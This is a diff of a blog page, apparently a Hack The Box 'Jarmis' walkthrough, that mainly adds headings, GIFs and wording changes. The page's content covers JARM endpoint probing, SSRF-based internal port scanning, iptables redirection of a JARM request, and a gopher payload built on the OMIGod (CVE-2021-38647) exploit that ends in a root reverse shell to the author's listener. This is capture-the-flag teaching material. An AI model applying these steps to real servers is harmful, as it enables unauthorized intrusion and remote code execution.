@@ -117,7 +117,7 @@
     "keywords": ["Hard","Linux","HTB","hacking","Web","Walkthrough"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "3242"
+    "wordCount": "3407"
   }]
   </script>
 
@@ -155,6 +155,9 @@
 
 
 
+
+
+<script defer src="/Secure-The-Throne/lib/typeit/typeit.umd.57f9bc6e047efc875cb4f2e9ca74c802de33638d2c3aff6d9b7eb3c7588c24649b6c3e51cd45f49c0ed0cf72aedbd694bf2d35f358a34076d63f9febabc0bd6f.js" integrity="sha512-V/m8bgR&#43;/IdctPLpynTIAt4zY40sOv9tm36zx1iMJGSbbD5RzUX0nA7Qz3Ku29aUvy0181ijQHbWP5/rq8C9bw=="></script>
 
 
 
@@ -678,7 +681,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-15T00:00:00&#43;00:00">15 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3242 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">16 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-03-15T00:00:00&#43;00:00">15 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3407 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">16 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/Secure-The-Throne/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
@@ -946,9 +949,20 @@
     <nav id="TableOfContents">
   <ul>
     <li><a href="#summary">Summary</a></li>
-    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a></li>
+    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a>
+      <ul>
+        <li><a href="#testing-the-endpoints">Testing the endpoints</a></li>
+        <li><a href="#understanding-jarm">Understanding JARM</a></li>
+        <li><a href="#testing-with-ssrf">Testing with SSRF</a></li>
+      </ul>
+    </li>
     <li><a href="#exploitation">Exploitation</a>
       <ul>
+        <li><a href="#cve-2021-38647">CVE-2021-38647</a>
+          <ul>
+            <li><a href="#preparing-the-stage">Preparing the stage</a></li>
+          </ul>
+        </li>
         <li><a href="#performing-the-attack">Performing the attack</a></li>
       </ul>
     </li>
@@ -966,9 +980,20 @@
     <nav id="TableOfContents">
   <ul>
     <li><a href="#summary">Summary</a></li>
-    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a></li>
+    <li><a href="#reconnaissance--enumeration">Reconnaissance &amp; Enumeration</a>
+      <ul>
+        <li><a href="#testing-the-endpoints">Testing the endpoints</a></li>
+        <li><a href="#understanding-jarm">Understanding JARM</a></li>
+        <li><a href="#testing-with-ssrf">Testing with SSRF</a></li>
+      </ul>
+    </li>
     <li><a href="#exploitation">Exploitation</a>
       <ul>
+        <li><a href="#cve-2021-38647">CVE-2021-38647</a>
+          <ul>
+            <li><a href="#preparing-the-stage">Preparing the stage</a></li>
+          </ul>
+        </li>
         <li><a href="#performing-the-attack">Performing the attack</a></li>
       </ul>
     </li>
@@ -1111,7 +1136,13 @@ HOP RTT       ADDRESS
 <li>The scan looks normal, with usual order of a web port and ssh port.</li>
 <li>From loading and looking at the favicon itself I can tell that this a react page</li>
 <li>The root page looks static, it&rsquo;s showing loading for a while now so I fired up ffuf for directory enumeration.</li>
-<li>Quickly ffuf finds couple of endpoints</li>
+<li>Quickly ffuf finds couple of endpoints
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExa2JkNzJiNmM5czEyczA4eGhmeWx6dThsZnQ3b2R1YXR3ZnI1M3NlayZlcD12MV9naWZzX3NlYXJjaCZjdD1n/ONmiNZnGPbrLWGYTEh/giphy.gif" alt="We-Got-something" />
+    
+  </figure>
+</li>
 </ul>
 <pre tabindex="0"><code>❯ ffuf -u http://10.10.11.117/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 60
 
@@ -1143,15 +1174,29 @@ robots.txt              [Status: 200, Size: 67, Words: 3, Lines: 4, Duration: 27
 static                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 262ms]
 :: Progress: [4744/4744] :: Job [1/1] :: 214 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
 </code></pre><ul>
-<li><code>/docs</code> gets me to API documentation as I expected</li>
-<li>![[Pasted image 20250314183340.png]]</li>
-<li>Let&rsquo;s test each endpoint one by one. The first endpoint <code>api/v1/search/id/{jarm_id}</code> takes an integer as input so I provided a random number and got a signature back as json data in the response</li>
-<li><strong>Endpoint-1</strong>
-<ul>
-<li>This is the curl command</li>
-</ul>
+<li><code>/docs</code> gets me to API documentation as I expected
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250314183340.png?raw=true" alt="Pasted image 20250314183340.png" />
+    
+  </figure>
 </li>
+<li>Let&rsquo;s test each endpoint one by one. The first endpoint <code>api/v1/search/id/{jarm_id}</code> takes an integer as input so I provided a random number and got a signature back as json data in the response</li>
 </ul>
+
+
+<h3 class="relative group">Testing the endpoints 
+    <div id="testing-the-endpoints" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#testing-the-endpoints" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Endpoint-1</strong>
+- This is the curl command</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s1">&#39;http://10.10.11.117/api/v1/search/id/3&#39;</span> -H <span class="s1">&#39;accept: application/json&#39;</span> <span class="p">|</span> jq
 </span></span></code></pre></div><ul>
 <li>Apparently the output may look like this</li>
@@ -1163,16 +1208,11 @@ static                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 2
 </span></span><span class="line"><span class="cl">  <span class="nt">&#34;endpoint&#34;</span><span class="p">:</span> <span class="s2">&#34;151.101.193.140:443&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">  <span class="nt">&#34;note&#34;</span><span class="p">:</span> <span class="s2">&#34;reddit.com&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Endpoint-2</strong>
+- Endpoint 2 is <code>api/v1/search/signature/?keyword=&lt;SIG&gt;&amp;max_results=10</code> takes string value as input
+- So when I input that signature from endpoint-1(Previous) it gives results.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s1">&#39;http://10.10.11.117/api/v1/search/signature/?keyword=29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&amp;max_results=10&#39;</span> -H <span class="s1">&#39;accept: application/json&#39;</span> <span class="p">|</span> jq
 </span></span></code></pre></div><ul>
-<li><strong>Endpoint-2</strong>
-<ul>
-<li>Endpoint 2 is <code>api/v1/search/signature/?keyword=&lt;SIG&gt;&amp;max_results=10</code> takes string value as input</li>
-<li>So when I input that signature from the endpoint-1 it gives results.</li>
-</ul>
-</li>
-</ul>
-<pre tabindex="0"><code>curl &#39;http://10.10.11.117/api/v1/search/signature/?keyword=29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&amp;max_results=10&#39; -H &#39;accept: application/json&#39; | jq
-</code></pre><ul>
 <li>Response:</li>
 </ul>
 <pre tabindex="0"><code>{
@@ -1222,17 +1262,22 @@ static                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 2
   ]
 }
 </code></pre><ul>
-<li>The results are odd anyway lets move to the next endpoint which should be the last one</li>
-<li><strong>Endpoint-3</strong>
+<li>The results are odd anyway lets move on to next endpoint which should be the last one in the list</li>
+</ul>
+<p><strong>Endpoint-3</strong>
+- This endpoint itself interesting as it ends in <code>/fetch</code> and takes a string as input. This is the full endpoint <code>/api/v1/fetch</code></p>
 <ul>
-<li>This endpoint itself interesting as it ends in <code>/fetch</code> and takes a string as input. This is the full endpoint <code>/api/v1/fetch</code></li>
+<li>Thi endpoint is promising so to test this I tried to hit back my host through this endpoint, First I spawned a nc listener and requested via this endpoint like this</li>
 </ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s1">&#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001&#39;</span> -H <span class="s1">&#39;accept: application/json&#39;</span>
+</span></span></code></pre></div><ul>
+<li>The reflection on nc my listener looks rather interesting cause, hmm&hellip;look at this
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/2VCSbTAr25QAAAAC/nonsense-talk.gif" alt="alien-lang" />
+    
+  </figure>
 </li>
-<li>First I spawned a nc listener and requested vi a this endpoint</li>
-</ul>
-<pre tabindex="0"><code>curl &#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001&#39; -H &#39;accept: application/json&#39;
-</code></pre><ul>
-<li>The reflection on my server looks rather interesting cause&hellip;hmm&hellip;look at this</li>
 </ul>
 <pre tabindex="0"><code>❯ nc -lnvp 6001
 listening on [any] 6001 ...
@@ -1245,12 +1290,21 @@ connect to [10.10.14.18] from (UNKNOWN) [10.10.11.117] 42834
 
 3&amp;$ �����}L�)z/3��7�U�Ս�4�Q�xI���-+%
 </code></pre><ul>
-<li>This looks like an encrypted value to me, it could be a certificate or handshake so I fired up a listener with ssl</li>
-<li>Installed <code>ncat</code> with <code>sudo apt-get install ncat</code> the used this command to get a listener with ssl</li>
+<li>This looks like an encrypted value to me, it could be a certificate or handshake but something encrypted that&rsquo;s for sure so I fired up a listener with ssl</li>
+<li>Typical nc(NetCat) may give errors cause by default nc doesn&rsquo;t support SSL so I installed <code>ncat</code> with <code>sudo apt-get install ncat</code> then used this command to get a listener with ssl.</li>
+</ul>
+<span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+     definition 
+  </span>
+</span>
+
+<ul>
+<li>&ldquo;ncat&rdquo; is a modern reimplementation of the venerable Netcat, developed by the Nmap Project, and is a flexible tool for reading, writing, redirecting, and encrypting data across a network, often used for security testing and administration tasks</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ncat --ssl -lnvp <span class="m">443</span>
 </span></span></code></pre></div><ul>
-<li>Now the connection just cuts off after two seconds</li>
+<li>Now the connection just cuts off after two seconds, Which is weird</li>
 </ul>
 <pre tabindex="0"><code>❯ ncat --ssl -lnvp 443
 Ncat: Version 7.95 ( https://nmap.org/ncat )
@@ -1270,11 +1324,40 @@ Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unex
   &#34;note&#34;: &#34;Ncat?&#34;,
   &#34;server&#34;: &#34;&#34;
 }
-</code></pre><ul>
-<li>JARM (or JARM fingerprinting) is ==an active Transport Layer Security (TLS) server fingerprinting tool developed by Salesforce== that helps identify and group servers based on their TLS configuration, potentially revealing malicious servers or malware command and control (C2) infrastructure</li>
-<li>This <a href="https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a/" target="_blank">article</a> goes in-depth with JARM but the bottom line is, JARM works by <strong>actively sending 10 TLS Client Hello packets to a target TLS server and capturing specific attributes of the TLS Server Hello responses</strong>. The aggregated TLS server responses are then hashed in a specific way to produce the JARM fingerprint.</li>
-<li>My guess here is the response signature that I got must be from the first request out of the ten intended ones because ncat allowed only one connection, I can change it allow multiple connections by including the <code>-k</code> flag.</li>
-<li>Now I actually got ten connections in the logs</li>
+</code></pre>
+
+<h3 class="relative group">Understanding JARM 
+    <div id="understanding-jarm" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#understanding-jarm" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>Before we move onto the next we have to learn about <strong>JARM</strong></li>
+</ul>
+<span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+     Definition 
+  </span>
+</span>
+
+<ul>
+<li>
+<p>JARM (or JARM fingerprinting) is an active Transport Layer Security (TLS) server fingerprinting tool developed by Salesforce that helps identify and group servers based on their TLS configuration, potentially revealing malicious servers or malware command and control (C2) infrastructure</p>
+</li>
+<li>
+<p>This <a href="https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a/" target="_blank">article</a> goes in-depth with JARM but the bottom line is, JARM works by <strong>actively sending 10 TLS Client Hello packets to a target TLS server and capturing specific attributes of the TLS Server Hello responses</strong>. The aggregated TLS server responses are then hashed in a specific way to produce the JARM fingerprint.</p>
+</li>
+<li>
+<p>My guess here is the response signature that I got must be from the first request out of the ten intended ones NetCat should&rsquo;ve allowed only one connection, I can change it allow multiple connections by including the <code>-k</code> flag.</p>
+</li>
+<li>
+<p>Now I actually got ten connections in the logs</p>
+</li>
 </ul>
 <pre tabindex="0"><code>❯ ncat --ssl -lnvkp 443
 Ncat: Version 7.95 ( https://nmap.org/ncat )
@@ -1315,7 +1398,7 @@ Ncat: Failed SSL connection from 10.10.11.117: error:0A00006C:SSL routines::bad 
   &#34;note&#34;: &#34;10.10.14.18&#34;
 }
 </code></pre><ul>
-<li>The response from single connection:</li>
+<li>This is the response from single connection:</li>
 </ul>
 <pre tabindex="0"><code>❯ curl &#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18&#39; -H &#39;accept: application/json&#39; | jq
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -1329,13 +1412,13 @@ Ncat: Failed SSL connection from 10.10.11.117: error:0A00006C:SSL routines::bad 
   &#34;server&#34;: &#34;&#34;
 }
 </code></pre><ul>
-<li>The response from the first to non-TLS listener:</li>
+<li>This the response from the first(From normal NetCat) or non-TLS listener:</li>
 </ul>
 <pre tabindex="0"><code>❯ curl &#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001&#39; -H &#39;accept: application/json&#39; 
 {&#34;sig&#34;:&#34;00000000000000000000000000000000000000000000000000000000000000&#34;,&#34;endpoint&#34;:&#34;10.10.14.18:6001&#34;,&#34;note&#34;:&#34;10.10.14.18&#34;}
 </code></pre><ul>
 <li>We can see the differences clearly. Also in my recent response multiple fields are missing (i.e. <code>server</code>, <code>ismalicious</code>)</li>
-<li>My recent response is not in the database</li>
+<li>As my recent response seemed weird I used the Endpoint-1 to check the signature and the response from the request shows that my recent response is not in the database</li>
 </ul>
 <pre tabindex="0"><code>❯ curl &#39;http://10.10.11.117/api/v1/search/signature/?keyword=21d19d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21&amp;max_results=10&#39; -H &#39;accept: application/json&#39; | jq
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -1345,8 +1428,8 @@ Ncat: Failed SSL connection from 10.10.11.117: error:0A00006C:SSL routines::bad 
   &#34;results&#34;: []
 }
 </code></pre><ul>
-<li>We can see in the previous requests as it made from ncat it shows <code>note</code> value as <code>NCAT?</code> also <code>ismalicious=false</code> which is suspicious, as there could be fields with true value.</li>
-<li>Thankfully we can identify this easily by iterating over all the values in the ID parameter. First let us narrow down the values</li>
+<li>We can see in the previous requests as it made from ncat it shows <code>note</code> value as <code>NCAT?</code> also <code>ismalicious=false</code> which is suspicious, as there could be fields with the value being true.</li>
+<li>Thankfully we can identify this easily by iterating over all the values in the ID parameter(Endpoint-1). First let us narrow down the values</li>
 </ul>
 <pre tabindex="0"><code>❯ curl http://10.10.11.117/api/v1/search/id/400 
 null%                                                                                                                  
@@ -1357,7 +1440,7 @@ HTB/Machines/Jarmis
 ❯ curl http://10.10.11.117/api/v1/search/id/200 
 {&#34;id&#34;:200,&#34;sig&#34;:&#34;29d29d00029d29d21c29d29d29d29df3fb741bc8febeb816e400df4c5f2e9e&#34;,&#34;ismalicious&#34;:false,&#34;endpoint&#34;:&#34;176.32.103.205:443&#34;,&#34;note&#34;:&#34;amazon.com&#34;}%  
 </code></pre><ul>
-<li>So the values should be between 0 to 200 something. Now lets get the accurate value</li>
+<li>So the values should be between 0 to 200 or in along those lines. Now lets get the accurate value</li>
 </ul>
 <pre tabindex="0"><code>HTB/Machines/Jarmis 
 ❯ curl http://10.10.11.117/api/v1/search/id/220
@@ -1471,7 +1554,7 @@ jq: parse error: Invalid numeric literal at line 1, column 7
   &#34;server&#34;: &#34;&#34;
 }
 </code></pre><ul>
-<li>There are 10 outputs,  metasploit looks interesting. Let&rsquo;s see what happens if listened from metasploit.</li>
+<li>There are like 10 outputs,  metasploit looks interesting. Let&rsquo;s see what happens if listened from metasploit.</li>
 <li>In metasploit select this module <code>auxillary/server/capture/http</code> and then set the port to 443, make SSL to true. Here is the oneliner</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo msfconsole -x <span class="s2">&#34;use auxiliary/server/capture/http; set srvport 443; set SSL true; run&#34;</span>
@@ -1496,7 +1579,19 @@ jq: parse error: Invalid numeric literal at line 1, column 7
 [*] Started service listener on 0.0.0.0:443 
 [*] Server started.
 [*] HTTP REQUEST 10.10.11.117 &gt; 10.10.14.18:80 GET / Unknown   cookies=
-</code></pre><ul>
+</code></pre>
+
+<h3 class="relative group">Testing with SSRF 
+    <div id="testing-with-ssrf" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#testing-with-ssrf" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
 <li>After a while, I tested the fetch endpoint for SSRF and there is SSRF to local host</li>
 <li>I can determine the open ports within the internal network with this vulnerability. The responses differ between open and closed, For an example</li>
 <li><strong>Open Port:</strong></li>
@@ -1535,8 +1630,38 @@ jq: parse error: Invalid numeric literal at line 1, column 7
   &#34;note&#34;: &#34;localhost&#34;
 }
 </code></pre><ul>
-<li>As you can see if the port is open it included <code>127.0.0.1</code> in the response else it gives the value <code>null</code></li>
-<li>To automate this I could use bash script but it would be slower</li>
+<li>As you can see if the port is open it includes <code>127.0.0.1</code> in the response else it gives the value <code>null</code>
+
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >To automate this I could use bash script but it would be slower, So <strong>choosing the script below is not recommended</strong></span>
+</div>
+</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
@@ -1573,7 +1698,7 @@ jq: parse error: Invalid numeric literal at line 1, column 7
 55394                   [Status: 200, Size: 120, Words: 1, Lines: 1, Duration: 332ms]
 </code></pre><ul>
 <li>Port <code>5986</code> and <code>5985</code> seems interesting particularly because in windows those ports are used by WinRM.</li>
-<li>In the ffuf scan I didn&rsquo;t get port <code>5985</code> but I tested it manually. It took 20 seconds to respond may be that&rsquo;s why ffuf marked it as closed but anyway this port seems interesting.</li>
+<li>In the ffuf scan I didn&rsquo;t get port <code>5985</code> but I tested it manually. It took me 20 seconds to respond may be that&rsquo;s why ffuf marked it as closed but anyway this port seems interesting.</li>
 </ul>
 <pre tabindex="0"><code>❯ curl &#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:5985&#39; -H &#39;accept: application/json&#39; | jq
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -1584,7 +1709,13 @@ jq: parse error: Invalid numeric literal at line 1, column 7
   &#34;endpoint&#34;: &#34;127.0.0.1:5985&#34;,
   &#34;note&#34;: &#34;localhost&#34;
 }
-</code></pre>
+</code></pre><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/oGkf9b9L9FsAAAAC/cbb2-cbbus2.gif" alt="it-starts" />
+    
+  </figure>
+</p>
+
 
 <h2 class="relative group">Exploitation 
     <div id="exploitation" class="anchor"></div>
@@ -1596,18 +1727,42 @@ jq: parse error: Invalid numeric literal at line 1, column 7
     </span>        
     
 </h2>
+
+
+<h3 class="relative group">CVE-2021-38647 
+    <div id="cve-2021-38647" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#cve-2021-38647" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
 <ul>
 <li>The port 5985 has Microsoft Open Management Infrastructure running we can exploit this service using <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-38647" target="_blank">CVE-2021-38647</a> and there is also a <a href="https://github.com/horizon3ai/CVE-2021-38647" target="_blank">POC</a> for this. But the POC just sends POST request to 5985 (Without TLS) or to 5986 (TLS included)</li>
-<li>Vulnerable part of this application is, Usually JARM sends 10 requests to verify and generate signature this part is known to us but here when the listener is malicious (i.e ismalicious=true) then JARM sends one extra request which is the 11th request. If we could get that request on listener then we could potentially modify it to exploit OMIGod(CVE-2021-38647).</li>
+<li>Vulnerable part of this application is, Usually JARM sends 10 requests to verify and generate signature this part is known to us but here when the listener is malicious (i.e ismalicious=true) then JARM sends one extra request which is the 11th request. If we could get that request on listener then we could potentially modify it to use the exploit OMIGod(CVE-2021-38647).</li>
 <li>To achieve this we need to modify the Ip tables rules as proxy chains doesn&rsquo;t support this level of precision</li>
-<li>Lets flush all the previous rules</li>
+<li>Lets flush all the previous rules in the IP tables</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo iptables -t nat -F
 </span></span></code></pre></div><ul>
-<li>Then add the rule to redirect the 11th request from <code>443</code> to port <code>8443</code></li>
+<li>Then add this rule to redirect the 11th request from <code>443</code> to port <code>8443</code></li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo iptables -I PREROUTING -t nat -p tcp --dport <span class="m">443</span> -m statistic --mode nth --every <span class="m">11</span> --packet <span class="m">10</span> -j REDIRECT --to-port <span class="m">8443</span>
-</span></span></code></pre></div><ul>
+</span></span></code></pre></div>
+
+<h4 class="relative group">Preparing the stage 
+    <div id="preparing-the-stage" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#preparing-the-stage" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ul>
 <li>To test this lets open two listeners, one on port <code>443</code> other on <code>8443</code></li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ncat --ssl -lnvp <span class="m">443</span>
@@ -1646,7 +1801,7 @@ Connection: keep-alive
 
 NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
 </code></pre><ul>
-<li>We can exploit this using Gopher protocol. I have used this protocol before when doing ![[5.8-Travel]] box, basically this protocol uses no headers thus perfect for delivering payloads</li>
+<li>Now we can exploit this using Gopher protocol. I have used this protocol before when doing Travel box, basically this protocol uses no headers thus perfect for delivering payloads</li>
 <li>I copied the payload data from the <a href="https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/refs/heads/main/omigod.py" target="_blank">POC</a> and after  that I added curly braces replacing previous command data then included it into this python code.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span>
@@ -1762,7 +1917,27 @@ WARNING: This is a development server. Do not use it in a production deployment.
 Press CTRL+C to quit
 10.10.11.117 - - [14/Mar/2025 23:55:13] &#34;GET / HTTP/1.1&#34; 301 -
 </code></pre><ul>
-<li>Got the reverse shell connection and secured both the User flag and Root flag</li>
+<li>Got the reverse shell connection and secured both the 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>User flag</span>
+  </span>
+</span>
+</div> &amp; 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>Root flag</span>
+  </span>
+</span>
+</div></li>
 </ul>
 <pre tabindex="0"><code>❯ nc -lvnp 6001
 
@@ -1782,7 +1957,28 @@ root@Jarmis:/root# cat /home/htb/user.txt
 cat /home/htb/user.txt
 e2848e17&lt;redacted&gt;
 root@Jarmis:/root# 
-</code></pre>
+</code></pre><div id="typeit-9adbcdab91a505b4d99e0f36eb21349c"></div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+      new TypeIt("#typeit-9adbcdab91a505b4d99e0f36eb21349c", {
+        strings: [" I hope you enjoyed my walkthrough, It took me lot of time to contruct everything, With that being said I hope that you would share this to your connections. But I have to mention this, if it weren't for 0xdf this writeup wouldn't possible. Thank you for reading my article, Hey! I really meant that Thank you.. See you soon on another",""],
+        speed:  100 ,
+        lifeLike:  false ,
+        startDelay:  0 ,
+        breakLines:  true ,
+        waitUntilVisible:  true ,
+        loop:  false 
+      }).go();
+    });
+</script>
+<p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/cTQhkMn8dLgAAAAC/car-bye.gif" alt="bye" />
+    
+  </figure>
+</p>
+
           
           
           
